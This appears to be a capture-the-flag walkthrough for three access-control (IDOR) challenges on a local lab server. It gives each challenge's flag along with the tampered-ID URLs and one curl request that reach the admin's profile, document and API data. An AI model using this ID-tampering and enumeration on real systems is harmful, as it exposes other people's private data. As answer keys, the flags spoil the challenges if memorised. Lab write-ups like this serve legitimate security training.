# IDOR / Access Control Walkthroughs

## Challenge 1: User Profile IDOR (Easy — 100pts)
**Flag:** `FLAG{id0r_acc3ss_c0ntrol}`

### Solution
Change the `id` parameter from 1 to 1337:
```
http://localhost:8080/challenges/idor/profile?id=1337
```
The admin profile is at ID 1337.

---

## Challenge 2: Document Access Control (Medium — 150pts)
**Flag:** `FLAG{h0riz0ntal_privesc_d0c}`

### Solution
Enumerate document IDs. Your docs are 100 and 101. Try higher numbers:
```
http://localhost:8080/challenges/idor/documents?id=999
```
Document 999 is the admin's confidential file.

---

## Challenge 3: API IDOR (Medium — 200pts)
**Flag:** `FLAG{4pi_id0r_n0_4uth_ch3ck}`

### Solution
The API doesn't check authorization:
```bash
curl http://localhost:8080/challenges/idor/api/user/1337
```
Returns the admin's data including the flag. The frontend only shows your profile, but the API serves any ID.
